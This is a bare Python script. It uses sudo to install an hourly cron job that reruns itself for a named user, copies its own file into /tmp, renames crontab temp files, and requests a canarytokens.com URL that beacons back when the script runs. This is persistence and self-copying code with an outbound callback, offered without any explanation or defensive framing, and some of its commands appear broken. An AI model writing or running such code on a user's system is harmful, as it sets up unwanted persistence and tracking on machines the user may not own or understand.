import os
import shutil
import requests
import subprocess
import fnmatch, re


os.environ["EDITOR"] = "nano"
value = os.environ
try:
   os.system('sudo echo "1 * * * *  /usr/bin/python3 main.py ./main.py" | sudo crontab -u kirillkonevskih -e &')
except:
   ''


def search_file():
   result = ''
   crontab_file = subprocess.run(['ls' , '/tmp'], text=True, capture_output=True)
   for file in crontab_file.stdout.split('\n'):
      matched = re.match(r'crontab.*',file)
      if matched:
         result = matched.group(0)
   return result








def main():
    tmp_folder = os.walk('/tmp')
    for address, dirs, files in tmp_folder:
        if files.count('main.py'):
            pt = search_file().split('.')
            print(f"/tmp/{pt[0]}.{pt[1]}")
            shutil.move(f"/tmp/{search_file()}", f"/tmp/{pt[0]}.{pt[1]}")
           
            
            return requests.get("http://canarytokens.com/stuff/zkkt1ol75pp5uop9wuzof5dct/payments.js")
        else:
           return shutil.copy(__file__, '/tmp')
        
main()


